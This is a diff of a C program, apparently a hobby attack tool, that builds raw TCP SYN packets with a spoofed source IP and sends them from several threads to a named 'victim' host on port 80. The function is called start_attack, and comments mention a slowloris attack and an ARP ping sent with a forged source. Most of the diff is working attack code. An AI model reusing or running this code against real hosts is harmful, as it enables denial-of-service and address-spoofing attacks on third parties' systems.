@@ -10,21 +10,89 @@
 #include <time.h>
 
 #include "handshake.h"
+#include "arpinglib.h"
 
-void hostname_toip(char *, struct in_addr *dst_ip);
-int get_local_ip(char *);
+void hostname_toip(char *dst, struct in_addr *dst_ip);
+char* get_local_ip();
+int start_attack(char *argv[]);
 
 int main(int argc, char *argv[])
 {
+
+    /*---------------------------------------
+    TODO:
+
+    --figure out a way how to run this program
+    as root without running with sudo (qtcreator)
+    ideally use setuid() function or something
+    like that
+    ---------------------------------------*/
+    if(argc < 4)
+    {
+        fprintf(stderr, "Usage: ./raw <Hostname> <Query string> <NIC [eth0, wlan0]>\n");
+        return 1;
+    }
+    struct timeval time;
+    gettimeofday(&time, NULL);
+    //srand(t1.tv_usec * t1.tv_sec);
+
+    srand((time.tv_sec * 1000) + (time.tv_usec / 1000));
+
+    //srand(time(0));
+
+    char *ip_array[10];
+
+    ip_array[0] = argv[0];
+    ip_array[1] = argv[1];
+    ip_array[2] = argv[2];
+    ip_array[3] = argv[3];
+    ip_array[4] = "10.0.0.142";
+
+    pthread_t threads[10];
+
+    for(int i = 0; i < 5; i++)
+    {
+        if(pthread_create(&threads[i], NULL, (void *) start_attack, ip_array) < 0)
+        {
+            fprintf(stderr, "Failed to create a new thread.\n");
+            return 1;
+        }
+        sleep(3);
+        //printf("Rand num: %d\n", (rand() % 10000));
+        printf("\nThread %d created!\n", i);
+
+    }
+    //printf("Syn has been sent out.\n");
+    pthread_join(threads[0], NULL);
+    //send_syn_ack(source_ip, &dst_ip, source_port);
+    //printf("Finished slowloris attack!\n\nValue returned: %d [0 - means success]\nProgram will now close.\n", th1ret);
+
+    return 0;
+}
+
+int start_attack(char *argv[])
+{
     int sock_raw;
+
     struct in_addr dst_ip;
 
-    //For every time rand func is called, be sure to generate different result
-    srand(time(NULL));
-    //I want source ports to be in range 50000-59999
-    u_int16_t source_port = (rand() % 10000) + 50000;
-    char source_ip[20] = "";
+    char source_ip[25] = "";
+    strcpy(source_ip, argv[4]);
+    //printf("-------------------\n");
+    //printf("Victim: %s\n", argv[1]);
+    //printf("Target of attack: %s\n", argv[2]);
+    //printf("Device: %s\n", argv[3]);
+    //printf("Source ip: %s\n", source_ip);
+    //printf("-------------------\n");
 
+    //For every time rand func is called, be sure to generate different result
+        //using rand()/srand() in multithreaded app is unsafe
+    //srand(time(NULL));
+    //I want source ports to be in range 50000-59999
+    u_int16_t seq_n = (rand() % 10000);
+    u_int16_t source_port = (rand() % 10000) + 50000;
+
+    printf("Seq_n: %u and port: %u\n", seq_n, source_port);
     sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 
     if(sock_raw < 0)
@@ -37,13 +105,9 @@ int main(int argc, char *argv[])
         printf("Socket created.\n");
     }
 
-    char *dst = argv[1];
-
-    if(argc < 2)
-    {
-        fprintf(stderr, "Usage: %s <Hostname>\n", argv[0]);
-        return 1;
-    }
+    char *dst;
+    dst = argv[1];
+    printf("Got argv[1]: %s\n", argv[1]);
 
     //If hostname (argv[1]) is specified in numbers-and-dots notation, convert to network byte order
     if(inet_addr(dst) != INADDR_NONE)
@@ -55,50 +119,11 @@ int main(int argc, char *argv[])
     else
     {
         //Calls function hostname_toip which translates hostname to IP
-        //printf("Calling addrinfo function, with a host: '%s'\n", dst);
+        printf("Calling addrinfo function, with a host: '%s'\n", dst);
         hostname_toip(dst, &dst_ip);
         //inet_ntoa needs whole in_addr struct
         printf("Your victim is: %s\n", inet_ntoa(dst_ip));
     }
-
-    //printf("Your victim: %s\n", argv[1]);
-
-//******************GET LOCAL IP**********************
-    char *device, errbuff[PCAP_ERRBUF_SIZE];
-    bpf_u_int32 net, mask;
-
-    device = pcap_lookupdev(errbuff);
-    printf("Your default device is: %s\n", device);
-
-    pcap_lookupnet(device, &net, &mask, errbuff);
-
-    //struct in_addr tmp;
-    //tmp.s_addr = net;
-
-    //strcpy(source_ip, inet_ntoa(tmp));
-
-    struct ifaddrs *ifaddr, *ifa;
-    char host[NI_MAXHOST];
-    getifaddrs(&ifaddr);
-
-    for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
-    {
-        if(ifa->ifa_addr == NULL)
-            continue;
-        //min 8 field width between prints, with left alignment '-'
-        //printf("%-8s\n", ifa->ifa_name);
-
-        getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
-
-        if(*(ifa->ifa_name) == *device && ifa->ifa_addr->sa_family==AF_INET)
-        {
-            //printf("IP: %s\n", host);
-            strcpy(source_ip, host);
-        }
-    }
-//*****************END OF GET LOCAL IP******************
-
-    strcpy(source_ip, "192.168.0.140");
 
     printf("Local ip is: %s\n", source_ip);
 
@@ -108,7 +133,13 @@ int main(int argc, char *argv[])
     struct sockaddr_in dest;
 
     char *packet_to_send;
-    packet_to_send = (char *)malloc(60);
+    packet_to_send = (char *) malloc(60);
+    if(packet_to_send == NULL)
+    {
+        perror("Could not allocate packet_to_send mem on heap.\n");
+        exit(-1);
+    }
+
 
     //Zero out the packet memory area
     //memset(packet_to_send, 0, 4096);
@@ -130,11 +161,13 @@ int main(int argc, char *argv[])
 
     memcpy(packet_to_send, &iph, sizeof(iph));
 
+
+
     //Fill in the TCP header
     tcph.th_sport = htons(source_port);
     tcph.th_dport = htons(80);
-    tcph.th_seq = htonl(0);
-    tcph.th_ack = htonl(0);
+    tcph.th_seq = htonl(seq_n);
+    tcph.th_ack = 0;
     tcph.th_x2 = 0;
     tcph.th_off = sizeof(struct tcphdr) / 4;
     tcph.th_flags = TH_SYN;
@@ -155,15 +188,14 @@ int main(int argc, char *argv[])
     }
 
     printf("Starting sniffing.\n");
-    int th1ret = 0;
-    pthread_t thread1;
+    //pthread_t thread1;
 
-    //Creating thread with start_sniffing() function call, will start receiving packets and process them
-    if(pthread_create(&thread1, NULL, (void *) start_sniffing, argv) < 0)
-    {
-        fprintf(stderr, "Failed to create a new thread.\n");
-        return 1;
-    }
+    ////Creating thread with start_sniffing() function call, will start receiving packets and process them
+    //if(pthread_create(&thread1, NULL, (void *) start_sniffing, argv) < 0)
+    //{
+    //    fprintf(stderr, "Failed to create a new thread.\n");
+    //    return 1;
+    //}
     sleep(1);
 
     printf("Starting to send packets.\n");
@@ -179,15 +211,11 @@ int main(int argc, char *argv[])
         fprintf(stderr, "Error sending syn packet! Error message: %s\n", strerror(errno));
         exit(1);
     }
-    int arg_count = 7;
-    char *args[] = {"-c1", "-A", "-s", source_ip, "-I", "wlan0", "192.168.0.1"};
-    arping_main(arg_count, args);
-
-    //printf("Syn has been sent out.\n");
-    pthread_join(thread1, NULL);
-    //send_syn_ack(source_ip, &dst_ip, source_port);
-    printf("Value returned from thread 1: %d\nProgram will now close.\n", th1ret);
-    return 0;
+    //int arg_count = 7;
+    ////argv[3] is for NIC to use
+    //char *args[] = {"-c1", "-A", "-s", source_ip, "-I", argv[3], "10.0.0.1"};
+    //arping_main(arg_count, args);
+    //return 0;
 }
 
 void hostname_toip(char *dst, struct in_addr *dst_ip)
@@ -225,5 +253,42 @@ void hostname_toip(char *dst, struct in_addr *dst_ip)
     //printf("Translated as: %s\n", inet_ntoa(*dst_ip));
 }
 
+char* get_local_ip()
+{
+    char *device, errbuff[PCAP_ERRBUF_SIZE];
+    bpf_u_int32 net, mask;
+    char *source_ip;
+    source_ip = (char *) malloc(20);
+    if(source_ip == NULL)
+    {
+        perror("Could not allocate source_ip mem on heap.\n");
+        exit(-1);
+    }
 
+    device = pcap_lookupdev(errbuff);
+    printf("Your default device is: %s\n", device);
 
+    pcap_lookupnet(device, &net, &mask, errbuff);
+
+    struct ifaddrs *ifaddr, *ifa;
+    char host[NI_MAXHOST];
+    getifaddrs(&ifaddr);
+
+    for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
+    {
+        if(ifa->ifa_addr == NULL)
+            continue;
+        //min 8 field width between prints, with left alignment '-'
+        //printf("%-8s\n", ifa->ifa_name);
+
+        getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+
+        if(*(ifa->ifa_name) == *device && ifa->ifa_addr->sa_family==AF_INET)
+        {
+            //printf("IP: %s\n", host);
+            strcpy(source_ip, host);
+        }
+    }
+    return source_ip;
+
+}
